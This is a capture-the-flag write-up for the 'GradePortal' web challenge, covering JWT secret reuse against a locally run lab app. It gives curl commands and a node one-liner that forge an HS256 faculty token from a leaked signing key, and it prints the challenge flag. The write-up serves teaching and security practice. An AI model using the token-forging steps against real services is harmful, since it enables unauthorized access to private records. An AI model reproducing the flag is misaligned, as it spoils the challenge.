# GradePortal - JWT Secret Reuse (Web, Hard)

**Author:** Siddharth Kabade
**Category:** Web
**Difficulty:** Hard

## Challenge Description

> The challenge repository does not include the exact player-facing prompt. Its README describes a university records application where a student discovers an exposed signing key and uses it to access the dean's confidential record.

Source: [GradePortal challenge repository](https://github.com/siddharthkabade7/ctfchallange1).

## Summary

After logging in with the supplied student account, the integrations endpoint reveals the key used to sign authentication JWTs. Signing a new token with a faculty role and the dean's record ID grants access to the confidential record.

## Flag

```
OWASP{jwt_secret_reuse_is_never_safe}
```

Verified against the locally running challenge source: the forged token returned record `2003` with this flag in its notes. This does not verify any separate deployed instance.

---

## Step 1 - Start the application and log in

The challenge README provides the student credentials. From the challenge repository, start the app:

```bash
npm ci
npm start
```

The default URL is `http://localhost:3000`:

```bash
export BASE_URL='http://localhost:3000'
```

Log in with the supplied account:

```bash
curl -sS -X POST "$BASE_URL/api/login" \
  -H 'Content-Type: application/json' \
  -d '{"username":"jdoe","password":"Fall2026!"}'
```

The login response identifies this account as a student. Copy its `token` value for the next requests:

```bash
export STUDENT_TOKEN='<token from the login response>'
```

## Step 2 - Retrieve the integrations signing key

Use the student token to access the integrations endpoint:

```bash
curl -sS "$BASE_URL/api/integrations/key" \
  -H "Authorization: Bearer $STUDENT_TOKEN"
```

The response includes `export_signing_key`. The challenge source uses this same value as the HS256 secret for authentication JWTs.

## Step 3 - Sign a faculty token

Create a token whose subject is the dean's record ID (`2003`) and whose role is `faculty`. Run this from the challenge repository, where `jsonwebtoken` is installed, and set `EXPORT_SIGNING_KEY` to the value returned in Step 2:

```bash
export EXPORT_SIGNING_KEY='<export_signing_key from the response>'
FORGED_TOKEN=$(node -e "const jwt = require('jsonwebtoken'); console.log(jwt.sign({ sub: 2003, role: 'faculty', name: 'Dr. Sunita Kapoor' }, process.env.EXPORT_SIGNING_KEY, { algorithm: 'HS256', expiresIn: '2h' }))")
```

The key exposure makes the signature valid. The records endpoint trusts the signed `role` claim for faculty access.

## Step 4 - Read the dean's record

Request record `2003` with the forged token:

```bash
curl -sS "$BASE_URL/api/records/2003" \
  -H "Authorization: Bearer $FORGED_TOKEN"
```

The returned record contains the flag in its notes.

## Solution Summary

| Field | Value |
|---|---|
| Initial account | `jdoe` (student) |
| Exposed value | JWT signing key from `/api/integrations/key` |
| Token algorithm | HS256 |
| Target record | `2003` (dean) |
| Result | Faculty token accesses the confidential record |

## Vulnerability Explanation

The integrations endpoint returns the same secret used to authenticate JWTs. Because the server trusts the signed `role` claim, anyone who can retrieve that key can create a valid faculty token and bypass the record ownership check. This is JWT secret disclosure and broken authorization, not SQL injection.

## Tools Used

- `curl` - call the login, integrations, and records endpoints
- Node.js and `jsonwebtoken` - sign the HS256 token
- Challenge source - confirm the endpoint behavior and claim checks

## Timeline

| Step | Action | Result |
|---|---|---|
| 1 | Log in with the supplied student account | Received a student JWT |
| 2 | Request `/api/integrations/key` | Retrieved the exposed signing key |
| 3 | Sign a token for subject `2003` with role `faculty` | Created a valid privileged JWT |
| 4 | Request `/api/records/2003` | Received the dean's record and locally verified flag |
